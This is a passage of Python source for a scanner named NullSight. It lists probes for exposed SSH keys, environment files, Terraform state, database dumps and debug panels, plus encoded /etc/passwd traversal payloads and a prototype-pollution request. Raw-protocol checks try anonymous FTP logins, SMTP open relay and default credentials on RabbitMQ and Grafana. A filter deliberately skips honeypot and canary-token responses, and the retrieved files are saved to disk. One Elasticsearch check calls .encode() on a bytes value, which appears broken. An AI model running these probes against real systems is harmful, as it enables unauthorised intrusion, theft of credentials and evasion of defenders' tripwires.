    Probe("/k8s/secrets.yaml",          "k8s/secrets.yaml"),
    Probe("/.terraform/terraform.tfstate", "Terraform state"),
    Probe("/terraform.tfstate",         "terraform.tfstate"),
    Probe("/terraform.tfvars",          "terraform.tfvars"),
    Probe("/.ansible/",                 "Ansible config"),
    Probe("/vault.yml",                 "Ansible vault"),
    Probe("/.circleci/config.yml",      "CircleCI config"),
    Probe("/.github/workflows/",        "GitHub Actions workflows"),

    # ── LINUX SYSTEM FILES ────────────────────────────────────
    Probe("/proc/self/environ",         "proc/self/environ"),
    Probe("/proc/self/cmdline",         "proc/self/cmdline"),
    Probe("/proc/self/maps",            "proc/self/maps"),
    Probe("/proc/version",              "proc/version"),
    Probe("/.htpasswd",                 ".htpasswd"),
    Probe("/.ssh/id_rsa",               ".ssh/id_rsa"),
    Probe("/.ssh/id_ed25519",           ".ssh/id_ed25519"),
    Probe("/.ssh/authorized_keys",      ".ssh/authorized_keys"),
    Probe("/.bash_history",             ".bash_history"),
    Probe("/.zsh_history",              ".zsh_history"),
    Probe("/etc/crontab",               "etc/crontab"),
    Probe("/etc/nginx/nginx.conf",      "nginx.conf"),
    Probe("/etc/apache2/apache2.conf",  "apache2.conf"),

    # ── PHP INFO ──────────────────────────────────────────────
    Probe("/phpinfo.php",               "phpinfo.php"),
    Probe("/info.php",                  "info.php"),
    Probe("/test.php",                  "test.php"),
    Probe("/php_info.php",              "php_info.php"),

    # ── WP CONFIG ─────────────────────────────────────────────
    Probe("/wp-config.php.bak",         "wp-config.php.bak"),
    Probe("/wp-config.php~",            "wp-config.php~"),
    Probe("/wp-config.php.swp",         "wp-config.php.swp"),
    Probe("/wp-config.php.old",         "wp-config.php.old"),
    Probe("/wp-json/wp/v2/users",       "WP user enum"),
    Probe("/xmlrpc.php",                "WP XML-RPC"),

    # ── LARAVEL DEBUG PANELS ──────────────────────────────────
    Probe("/telescope/requests",        "Laravel Telescope"),
    Probe("/_debugbar/open",            "Laravel DebugBar"),
    Probe("/log-viewer",                "Laravel Log Viewer"),
    Probe("/log-viewer/logs",           "Laravel Log Viewer logs"),
    Probe("/horizon/dashboard",         "Laravel Horizon"),

    # ── YII2 DEBUG ────────────────────────────────────────────
    Probe("/debug/default/view",        "Yii2 debug panel"),
    Probe("/index.php?r=debug/default/view", "Yii2 debug view"),

    # ── RAILS DEBUG ───────────────────────────────────────────
    Probe("/rails/info/properties",     "Rails info properties"),
    Probe("/rails/mailers",             "Rails mailer preview"),
    Probe("/rails/info/routes",         "Rails routes"),

    # ── ELASTICSEARCH ─────────────────────────────────────────
    Probe("/_cat/indices?v",            "Elasticsearch indices"),
    Probe("/_cluster/health",           "Elasticsearch health"),
    Probe("/_cat/nodes?v",              "Elasticsearch nodes"),
    Probe("/_nodes",                    "Elasticsearch nodes detail"),
    Probe("/_all/_search",              "Elasticsearch all search"),

    # ── TOMCAT ────────────────────────────────────────────────
    Probe("/WEB-INF/web.xml",           "Tomcat WEB-INF/web.xml"),
    Probe("/WEB-INF/classes/application.properties", "WEB-INF app.properties"),
    Probe("/manager/html",              "Tomcat Manager UI"),
    Probe("/manager/text/list",         "Tomcat Manager list"),
    Probe("/host-manager/html",         "Tomcat Host Manager"),

    # ── DATABASE / BACKUP FILES ───────────────────────────────
    Probe("/backup.sql",                "backup.sql"),
    Probe("/dump.sql",                  "dump.sql"),
    Probe("/database.sql",              "database.sql"),
    Probe("/db.sql",                    "db.sql"),
    Probe("/db.sqlite3",                "db.sqlite3"),
    Probe("/database.db",               "database.db"),
    Probe("/config/database.yml",       "config/database.yml"),
    Probe("/database.yml",              "database.yml"),
    Probe("/storage/db.sqlite",         "storage/db.sqlite"),
    Probe("/storage/database.sqlite",   "storage/database.sqlite"),
    Probe("/data/data.sql",             "data/data.sql"),
    Probe("/backup/",                   "backup dir"),
    Probe("/backups/",                  "backups dir"),
    Probe("/db_backup/",                "db_backup dir"),

    # ── PROMETHEUS ────────────────────────────────────────────
    Probe("/metrics",                   "Prometheus metrics"),
    Probe("/prometheus/metrics",        "Prometheus /prometheus/metrics"),
    Probe("/api/v1/targets",            "Prometheus targets"),
    Probe("/api/v1/status/config",      "Prometheus config"),

    # ── SWAGGER / API DOCS ────────────────────────────────────
    Probe("/swagger.json",              "Swagger JSON"),
    Probe("/swagger.yaml",              "Swagger YAML"),
    Probe("/openapi.json",              "OpenAPI JSON"),
    Probe("/openapi.yaml",              "OpenAPI YAML"),
    Probe("/api-docs",                  "API docs"),
    Probe("/api/swagger.json",          "API Swagger"),
    Probe("/v1/api-docs",               "v1 API docs"),
    Probe("/v2/api-docs",               "v2 API docs"),
    Probe("/v3/api-docs",               "v3 API docs"),

    # ── GENERIC PATH TRAVERSAL ────────────────────────────────
    Probe("/%2e%2e/%2e%2e/etc/passwd",                        "URL-encoded traversal"),
    Probe("/.%2e/.%2e/etc/passwd",                            "Dot-slash traversal"),
    Probe("/..%c0%af..%c0%afetc%c0%afpasswd",                 "UTF-8 overlong traversal"),
    Probe("/%252e%252e%252f%252e%252e%252fetc%252fpasswd",    "Double URL-enc traversal"),
    Probe("/..;/..;/etc/passwd",                              "Semicolon bypass traversal"),
    Probe("/..%5c..%5cetc%5cpasswd",                          "Backslash URL traversal"),

    # ── PROTOTYPE POLLUTION ───────────────────────────────────
    Probe("/api/test",                  "Prototype pollution probe",
          method="POST",
          body={"__proto__": {"polluted": "NULLSIGHT_TEST_7731"}},
          extra_headers={"Content-Type": "application/json"}),

    # ── MISCELLANEOUS MISCONFIG ───────────────────────────────
    Probe("/.DS_Store",                 ".DS_Store macOS"),
    Probe("/crossdomain.xml",           "crossdomain.xml"),
    Probe("/clientaccesspolicy.xml",    "clientaccesspolicy.xml"),
    Probe("/robots.txt",                "robots.txt"),
    Probe("/sitemap.xml",               "sitemap.xml"),
    Probe("/.well-known/security.txt",  "security.txt"),
    Probe("/server-status",             "Apache server-status"),
    Probe("/server-info",               "Apache server-info"),
    Probe("/.htaccess",                 ".htaccess"),
    Probe("/web.config",                "web.config"),
    Probe("/config.xml",                "config.xml"),
    Probe("/config.json",               "config.json"),
    Probe("/config.yml",                "config.yml"),
    Probe("/config.php.bak",            "config.php.bak"),
    Probe("/settings.py",               "Django settings.py"),
    Probe("/settings.local.py",         "Django settings.local.py"),
    Probe("/application.properties",    "Spring application.properties"),
    Probe("/application.yml",           "Spring application.yml"),
    Probe("/application-prod.properties", "Spring prod properties"),
    Probe("/WEB-INF/applicationContext.xml", "Spring applicationContext"),
    Probe("/.bash_profile",             ".bash_profile"),
    Probe("/.profile",                  ".profile"),

    # ── JIRA ──────────────────────────────────────────────────
    Probe("/rest/api/2/serverInfo",     "Jira server info"),
    Probe("/rest/api/2/user?username=admin", "Jira user enum"),

    # ── MATTERMOST ────────────────────────────────────────────
    Probe("/api/v4/users",              "Mattermost users API"),
    Probe("/api/v4/config",             "Mattermost config"),

    # ── DOCKER ────────────────────────────────────────────────
    Probe("/v1.41/version",             "Docker API version"),
    Probe("/v1.41/containers/json",     "Docker containers"),
    Probe("/v1.41/images/json",         "Docker images"),
    Probe("/version",                   "Docker daemon version"),
]

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 2: SYSTEM SERVICE SCANNER — REAL AUTH VERIFICATION
#  Real verification approach:
#  - FTP: actual anonymous login attempt (ftplib-style bytes)
#  - Redis: PING → +PONG, then INFO, check requirepass
#  - MongoDB: wire protocol query, check auth error vs success
#  - MySQL: handshake → check if auth required
#  - PostgreSQL: startup → check auth method
#  - Memcached: stats → check if auth required
#  - RabbitMQ: HTTP API with guest:guest
#  - Elasticsearch: GET / → check cluster accessible
#  - Docker: GET /version → check API accessible
#  - Jupyter: GET /api → check token required
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ServiceFinding:
    host:           str
    port:           int
    service:        str
    severity:       str
    description:    str
    banner:         str  = ""
    verified:       bool = False   # True = actual auth bypass confirmed
    auth_detail:    str  = ""      # e.g. "anonymous login success", "no auth required"
    tags:           list = field(default_factory=list)
    timestamp:      str  = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class ServiceCheck:
    port:            int
    service:         str
    severity:        str
    description:     str
    tags:            list = field(default_factory=list)
    probe_bytes:     Optional[bytes]  = None
    confirm_pattern: Optional[bytes]  = None
    banner_pattern:  Optional[re.Pattern] = None
    # Auth verification: if set, send this after banner/confirm, expect auth_success_pattern
    auth_probe:      Optional[bytes]  = None
    auth_success:    Optional[bytes]  = None
    auth_fail:       Optional[bytes]  = None

SERVICE_CHECKS: list[ServiceCheck] = [

    # ─────────────────────────────────────────────────────────
    # FTP Anonymous Login — REAL verification
    # Send: USER anonymous\r\n → 331 (password required)
    # Send: PASS anonymous@\r\n → 230 (login successful) = CONFIRMED
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=21, service="FTP",
        severity="CRITICAL",
        description="FTP anonymous login enabled — unauthenticated file access confirmed",
        tags=["ftp", "anonymous"],
        probe_bytes=b"USER anonymous\r\n",
        confirm_pattern=b"331",
        # After 331, send PASS
        auth_probe=b"PASS anonymous@nullsight.uz\r\n",
        auth_success=b"230",    # 230 = Login successful
        auth_fail=b"530",       # 530 = Login incorrect
        banner_pattern=re.compile(rb'220.*(?:ftp|vsftpd|proftpd|filezilla|pure-ftpd)', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # SSH version disclosure
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=22, service="SSH",
        severity="HIGH",
        description="SSH service exposed — banner version disclosure",
        tags=["ssh", "info-disclosure"],
        banner_pattern=re.compile(rb'SSH-\d+\.\d+-(OpenSSH|Dropbear|libssh)', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # SMTP — banner grab + check for open relay
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
    port=25,
    service="SMTP",
    severity="HIGH",
    description="SMTP service exposed — potential open relay",
    tags=["smtp", "email"],
    probe_bytes=b"EHLO nullsight-probe\r\n",
    confirm_pattern=b"250",

    auth_probe=(
        b"MAIL FROM:<probe@nullsight.uz>\r\n"
        b"RCPT TO:<test@gmail.com>\r\n"
    ),

    auth_success=b"250",
    auth_fail=b"554",

    banner_pattern=re.compile(
        rb"220.*(?:SMTP|Postfix|Exim|Sendmail|MailEnable|Lotus)",
        re.I
    ),
),

    # ─────────────────────────────────────────────────────────
    # Redis unauthenticated — REAL verification
    # PING → +PONG = confirmed no auth
    # Then INFO → check "requirepass" or "maxmemory"
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=6379, service="Redis",
        severity="CRITICAL",
        description="Redis unauthenticated — full data access and potential RCE (CONFIG SET dir)",
        tags=["redis", "database", "rce"],
        probe_bytes=b"PING\r\n",
        confirm_pattern=b"+PONG",
        auth_probe=b"INFO server\r\n",
        auth_success=b"redis_version:",
        banner_pattern=re.compile(rb'\+PONG|\$\d+\r\n|redis_version:', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # MongoDB unauthenticated — wire protocol
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=27017, service="MongoDB",
        severity="CRITICAL",
        description="MongoDB unauthenticated — database read/write access confirmed",
        tags=["mongodb", "database"],
        # OP_QUERY isMaster
        probe_bytes=bytes.fromhex(
            "3a000000" "00000000" "00000000" "d4070000"
            "00000000" "00000000" "00000000" "14000000"
            "01" "69734d61737465720000000000f03f" "00"
        ),
        confirm_pattern=b"ismaster",
        # Send listDatabases to verify actual access
        auth_probe=bytes.fromhex(
            "48000000" "01000000" "00000000" "d4070000"
            "00000000" "00000000" "00000000" "22000000"
            "10" "6c697374446174616261736573" "00" "01000000"
            "01" "24636d64" "00" "01000000" "00"
        ),
        auth_success=b"databases",
        auth_fail=b"not authorized",
        banner_pattern=re.compile(rb'ismaster|MongoDB|databases', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Elasticsearch unauthenticated — HTTP API
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=9200, service="Elasticsearch",
        severity="CRITICAL",
        description="Elasticsearch unauthenticated — cluster and index data accessible",
        tags=["elasticsearch", "database"],
        probe_bytes=b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"cluster_name",
        auth_probe=b"GET /_cat/indices HTTP/1.0\r\nHost: localhost\r\n\r\n",
        auth_success=b"green\|yellow\|red".encode() or b"index",
        banner_pattern=re.compile(rb'cluster_name|elasticsearch|You Know, for Search', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Memcached unauthenticated
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=11211, service="Memcached",
        severity="CRITICAL",
        description="Memcached unauthenticated — cache data read/write access",
        tags=["memcached", "database"],
        probe_bytes=b"stats\r\n",
        confirm_pattern=b"STAT",
        auth_probe=b"stats items\r\n",
        auth_success=b"STAT items:",
        banner_pattern=re.compile(rb'STAT\s+\w+|VERSION \d', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # MySQL — banner grab + check for anonymous access
    # MySQL server greeting → check if root no-password possible
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=3306, service="MySQL",
        severity="CRITICAL",
        description="MySQL port exposed — check for unauthenticated or anonymous access",
        tags=["mysql", "database"],
        # MySQL sends greeting on connect; we read it
        banner_pattern=re.compile(rb'mysql|MariaDB|\x00.{4}mysql_native_password|\x0a\d+\.\d+\.\d+', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # PostgreSQL — startup packet, check auth method
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=5432, service="PostgreSQL",
        severity="HIGH",
        description="PostgreSQL port exposed — check for trust auth or weak credentials",
        tags=["postgresql", "database"],
        # PostgreSQL startup message
        probe_bytes=(
            b"\x00\x00\x00\x54"      # length 84
            b"\x00\x03\x00\x00"      # protocol 3.0
            b"user\x00postgres\x00"
            b"database\x00postgres\x00"
            b"application_name\x00nullsight\x00"
            b"\x00"
        ),
        confirm_pattern=b"R",   # Auth request
        # If response is AuthOK (R\x00\x00\x00\x08\x00\x00\x00\x00) = trust auth
        auth_success=b'R\x00\x00\x00\x08\x00\x00\x00\x00',
        auth_fail=b"password authentication failed",
        banner_pattern=re.compile(rb'PostgreSQL|FATAL.*password|FATAL.*authentication', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # RabbitMQ Management UI — default guest:guest
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=15672, service="RabbitMQ Management",
        severity="CRITICAL",
        description="RabbitMQ management — default guest/guest credentials accepted",
        tags=["rabbitmq", "amqp"],
        # HTTP GET /api/overview with Basic Auth guest:guest (Z3Vlc3Q6Z3Vlc3Q=)
        probe_bytes=b"GET /api/overview HTTP/1.0\r\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"rabbitmq_version",
        auth_success=b"rabbitmq_version",
        auth_fail=b"Unauthorized",
        banner_pattern=re.compile(rb'rabbitmq_version|management_version|product_name', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Docker daemon — unauthenticated
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=2375, service="Docker Daemon",
        severity="CRITICAL",
        description="Docker daemon unauthenticated — full container/host control (RCE)",
        tags=["docker", "rce"],
        probe_bytes=b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"ApiVersion",
        auth_probe=b"GET /containers/json HTTP/1.0\r\nHost: localhost\r\n\r\n",
        auth_success=b"Id",
        banner_pattern=re.compile(rb'ApiVersion|DockerVersion|GoVersion', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Kubernetes API (insecure HTTP)
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=8080, service="Kubernetes API (insecure)",
        severity="CRITICAL",
        description="Kubernetes insecure API port — unauthenticated cluster control",
        tags=["k8s"],
        probe_bytes=b"GET /api/v1/namespaces HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b'"kind":"NamespaceList"',
        auth_success=b"NamespaceList",
        banner_pattern=re.compile(rb'"namespaces"|"apiVersion"|NamespaceList', re.I),
    ),

    # Kubernetes API (HTTPS, check if accessible)
    ServiceCheck(
        port=6443, service="Kubernetes API (HTTPS)",
        severity="HIGH",
        description="Kubernetes HTTPS API port — verify RBAC configuration",
        tags=["k8s"],
        banner_pattern=re.compile(rb'Kubernetes|k8s|CERTIFICATE|API', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Grafana — check default admin/admin
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=3000, service="Grafana",
        severity="HIGH",
        description="Grafana exposed — test admin/admin default credentials",
        tags=["grafana", "monitoring"],
        # Basic auth admin:admin (YWRtaW46YWRtaW4=)
        probe_bytes=b"GET /api/org HTTP/1.0\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"orgId",
        auth_success=b"orgId",
        auth_fail=b"Invalid username",
        banner_pattern=re.compile(rb'orgId|Grafana|"name":"Main Org"', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Kibana
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=5601, service="Kibana",
        severity="HIGH",
        description="Kibana exposed — unauthenticated Elasticsearch UI",
        tags=["kibana", "elasticsearch"],
        probe_bytes=b"GET /api/status HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"kibana",
        banner_pattern=re.compile(rb'kibana|"version".*"number"', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # SMB — null session
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=445, service="SMB",
        severity="HIGH",
        description="SMB exposed — test null session / EternalBlue",
        tags=["smb", "windows"],
        banner_pattern=re.compile(rb'SMB|\xffSMB|\xfeSMB|NTLMSSP', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # LDAP — anonymous bind
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=389, service="LDAP",
        severity="HIGH",
        description="LDAP exposed — test anonymous bind",
        tags=["ldap", "auth"],
        # LDAP anonymous bind request
        probe_bytes=bytes.fromhex("300c020101600702010304008000"),
        confirm_pattern=b"\x61",  # BindResponse
        auth_success=b"\x0a\x01\x00",  # resultCode: success (0)
        banner_pattern=re.compile(rb'OpenLDAP|Active Directory|\x61\x0a\x0a\x01', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # VNC — check no-auth
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=5900, service="VNC",
        severity="CRITICAL",
        description="VNC service — check no-auth security type",
        tags=["vnc", "remote"],
        # VNC handshake: server sends RFB version
        # Client version response
        probe_bytes=b"RFB 003.008\n",
        # Server sends security types; type 1 = None (no auth)
        confirm_pattern=b"\x01\x01",  # 1 security type: type 1 (None)
        auth_success=b"\x01",         # SecurityType 1 = None
        banner_pattern=re.compile(rb'RFB \d+\.\d+', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Jupyter Notebook — check no token
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=8888, service="Jupyter Notebook",
        severity="CRITICAL",
        description="Jupyter Notebook — check if token-free access possible (direct code exec)",
        tags=["jupyter", "rce"],
        probe_bytes=b"GET /api HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b'"version"',
        auth_probe=b"GET /api/kernels HTTP/1.0\r\nHost: localhost\r\n\r\n",
        auth_success=b"[]",   # Empty kernel list = accessible without token
        auth_fail=b"401",
        banner_pattern=re.compile(rb'"version".*"notebook"|"kernels"', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Cassandra
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=9042, service="Cassandra",
        severity="CRITICAL",
        description="Cassandra CQL port exposed — test unauthenticated access",
        tags=["cassandra", "database"],
        # CQL STARTUP message
        probe_bytes=bytes.fromhex("040000010016000000120001000b435153535f56455253494f4e000533302e302e30"),
        confirm_pattern=b"\x84\x00",  # READY frame
        banner_pattern=re.compile(rb'CASSANDRA|CQL|READY|\x84\x00', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Consul
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=8500, service="HashiCorp Consul",
        severity="CRITICAL",
        description="Consul HTTP API exposed — service discovery and KV store accessible",
        tags=["consul", "k8s"],
        probe_bytes=b"GET /v1/agent/self HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"Config",
        auth_success=b'"Datacenter"',
        banner_pattern=re.compile(rb'"Datacenter"|"Config"|consul', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # etcd
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=2379, service="etcd",
        severity="CRITICAL",
        description="etcd exposed — Kubernetes cluster secrets accessible",
        tags=["etcd", "k8s", "secret"],
        probe_bytes=b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"etcdserver",
        auth_success=b"etcdcluster",
        banner_pattern=re.compile(rb'etcdserver|etcdcluster', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # CouchDB
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=5984, service="CouchDB",
        severity="CRITICAL",
        description="CouchDB HTTP API exposed — test anonymous access",
        tags=["couchdb", "database"],
        probe_bytes=b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"couchdb",
        auth_probe=b"GET /_all_dbs HTTP/1.0\r\nHost: localhost\r\n\r\n",
        auth_success=b"[",
        banner_pattern=re.compile(rb'couchdb|CouchDB|"Welcome"', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # InfluxDB
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=8086, service="InfluxDB",
        severity="HIGH",
        description="InfluxDB HTTP API exposed — time-series data accessible",
        tags=["influxdb", "monitoring"],
        probe_bytes=b"GET /ping HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"204",
        banner_pattern=re.compile(rb'influxdb|X-Influxdb-Version', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # MinIO / S3-compatible storage
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=9000, service="MinIO",
        severity="HIGH",
        description="MinIO object storage exposed — check for public buckets",
        tags=["minio", "storage"],
        probe_bytes=b"GET /minio/health/live HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"200",
        banner_pattern=re.compile(rb'MinIO|minio|x-amz-request-id', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Prometheus
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=9090, service="Prometheus",
        severity="MEDIUM",
        description="Prometheus exposed — metrics and target config visible",
        tags=["prometheus", "monitoring"],
        probe_bytes=b"GET /api/v1/status/config HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"scrape_configs",
        banner_pattern=re.compile(rb'scrape_configs|Prometheus|prometheus', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Portainer
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=9443, service="Portainer",
        severity="HIGH",
        description="Portainer exposed — Docker/K8s management UI",
        tags=["portainer", "docker"],
        banner_pattern=re.compile(rb'Portainer|portainer', re.I),
    ),

    # ─────────────────────────────────────────────────────────
    # Celery Flower
    # ─────────────────────────────────────────────────────────
    ServiceCheck(
        port=5555, service="Celery Flower",
        severity="HIGH",
        description="Celery Flower exposed — task queue management (potential RCE via task execution)",
        tags=["celery", "rce"],
        probe_bytes=b"GET /api/workers HTTP/1.0\r\nHost: localhost\r\n\r\n",
        confirm_pattern=b"celery",
        banner_pattern=re.compile(rb'celery|flower|Flower', re.I),
    ),
]

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Finding:
    url:            str
    path:           str
    label:          str
    method:         str
    status_code:    int
    content_length: int
    signature_name: str
    severity:       str
    description:    str
    cve:            str
    tags:           list
    snippet:        str
    entropy_flag:   bool = False
    saved_file:     str  = ""
    timestamp:      str  = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class Stats:
    total:        int   = 0
    done:         int   = 0
    errors:       int   = 0
    findings:     int   = 0
    throttled:    int   = 0
    sys_checks:   int   = 0
    sys_findings: int   = 0
    start_time:   float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def rps(self) -> float:
        return self.done / max(self.elapsed, 1)

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  FALSE-POSITIVE FILTER — 8-layer strict filter
#  Layer 1: content-length guard
#  Layer 2: soft-404 / generic error page
#  Layer 3: HTML response → only html_allowed sigs
#  Layer 4: required_path_pattern check
#  Layer 5: signature-specific content validation
#  Layer 6: entropy check for secret patterns
#  Layer 7: Anti-honeypot (server-specific FP patterns)
#  Layer 8: Status code validation
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
SOFT_404 = re.compile(
    r'404\s*not\s*found|page\s*not\s*found|does\s*not\s*exist|no\s*such\s*file|'
    r'error\s*404|<title>\s*(?:404|error|not found)|oops[!,]?|nothing\s*here|'
    r'resource not found|access denied|forbidden|under construction|coming soon|'
    r'page not available|нет страницы|sahifa topilmadi|страница не найдена|'
    r'topilmadi|bunday\s*sahifa|404 xato',
    re.I)

GENERIC_PAGE = re.compile(
    r'<meta\s+name="csrf-(?:token|param)"|'
    r'window\.__NUXT__|__NEXT_DATA__|ng-version=|react-root|'
    r'wp-content/themes|wp-includes/js',
    re.I)

# Patterns that indicate a legit framework debug page (not FP)
DEBUG_INDICATORS = re.compile(
    r'yii\s+Debug|Yii2\s+Debug\s+Panel|'
    r"You're seeing this error because you have DEBUG|"
    r'Illuminate\\.*?Exception|Application Trace.*?Framework Trace|'
    r'app_debug.*?true|app_env.*?(?:local|dev)',
    re.I | re.S)

# Honeypot indicators — responses that look real but are decoys
HONEYPOT = re.compile(
    r'honeypot|canary\s+token|canarytokens|thinkst|tripwire',
    re.I)

def is_false_positive(
    ct: str, cl: int, body: bytes,
    sig: Signature, path: str = "", status: int = 200,
) -> bool:
    text = body.decode("utf-8", errors="replace")

    # Layer 1: minimum content length
    if cl < sig.min_content_length:
        return True

    # Layer 2: soft-404 / generic error
    if SOFT_404.search(text[:2000]):
        return True

    # Layer 3: HTML content-type check
    is_html = bool(re.search(r'text/html|application/xhtml', ct, re.I))
    if is_html and not sig.html_allowed:
        return True

    # Layer 3b: HTML allowed but generic page
    if is_html and sig.html_allowed:
        if GENERIC_PAGE.search(text[:2000]):
            if ("debug" in sig.name.lower() or "missconfig" in " ".join(sig.tags)):
                if not DEBUG_INDICATORS.search(text):
                    return True

    # Layer 4: required_path_pattern
    if sig.required_path_pattern is not None:
        if not sig.required_path_pattern.search(path):
            return True

    # Layer 5: signature-specific validation
    if sig.name == "Generic env block (multi-line KEY=VALUE)":
        matches = re.findall(r'^[A-Za-z_][A-Za-z0-9_]{2,39}=.+$', text, re.M)
        if len(matches) < 3:
            return True

    if "php://filter" in sig.name.lower() or "base64 leak" in sig.name.lower():
        b64_lines = re.findall(r'^[A-Za-z0-9+/]{100,}={0,2}$', text, re.M)
        if not b64_lines:
            return True

    if sig.name == "GraphQL introspection enabled":
        if '"__schema"' not in text and "__schema" not in text:
            return True

    if sig.name == "Directory listing enabled":
        links = re.findall(r'href=["\'][^"\'?#]+["\']', text)
        if len(links) < 3:
            return True

    if sig.name in ("SQL database backup exposed",):
        # Must have multiple SQL statements
        sql_stmts = re.findall(r'(?:CREATE|INSERT|DROP|ALTER)\s+(?:TABLE|DATABASE|INTO)', text, re.I)
        if len(sql_stmts) < 2:
            return True

    if "SSTI" in sig.name and "math" in sig.name.lower():
        # Verify 49 or 7777777 is actually in response as a result
        if not re.search(r'\b49\b|\b7777777\b', text):
            return True

    # require_also: both patterns must match
    if sig.require_also is not None:
        if not sig.require_also.search(text):
            return True

    # Layer 6: entropy check for secret-bearing patterns
    if any(t in sig.tags for t in ("secret", "token", "key", "env")) and "exposed" in sig.name.lower():
        # Require at least one high-entropy token
        found_entropy = False
        for token in re.findall(r'[A-Za-z0-9+/=_\-]{20,}', text):
            if shannon_entropy(token) >= 3.5:
                found_entropy = True
                break
        # Exception: structured credential patterns don't need entropy check
        if not found_entropy:
            has_structured = re.search(
                r'DB_PASSWORD=|APP_KEY=base64:|-----BEGIN.*KEY|aws_access_key_id', text, re.I)
            if not has_structured:
                return True

    # Layer 7: honeypot detection
    if HONEYPOT.search(text[:500]):
        return True

    # Layer 8: status code sanity
    # For file exposure (env, git, etc.) — redirect responses are suspicious
    if status in (301, 302, 307, 308):
        if any(t in sig.tags for t in ("env", "git", "secret", "lfi")):
            return True

    return False

# ─────────────────────────────────────────────────────────────────────────────
# SAVE FILE
# ─────────────────────────────────────────────────────────────────────────────
async def save_found_file(
    root_url: str, path: str, label: str,
    status_code: int, content_type: str,
    body: bytes, output_dir: Path, console: Console,
) -> str:
    ext        = save_extension(path, content_type, body)
    parsed     = urlparse(root_url)
    domain     = parsed.netloc.replace(".", "_").replace(":", "_")
    ts         = datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")[:19]
    safe_label = re.sub(r'[/\\:*?"<>|]', "_", label)[:60]
    filename   = f"found_{ts}_{domain}_{safe_label}{ext}"
    filepath   = output_dir / filename

    try:
        if ext in (".txt", ".json", ".html", ".xml"):
            text = body.decode("utf-8", errors="replace")
            with open(filepath, "w", encoding="utf-8") as f:
                if ext != ".json":
                    f.write(f"# NullSight v3.0 Finding\n"
                            f"# URL: {root_url}{path}\n"
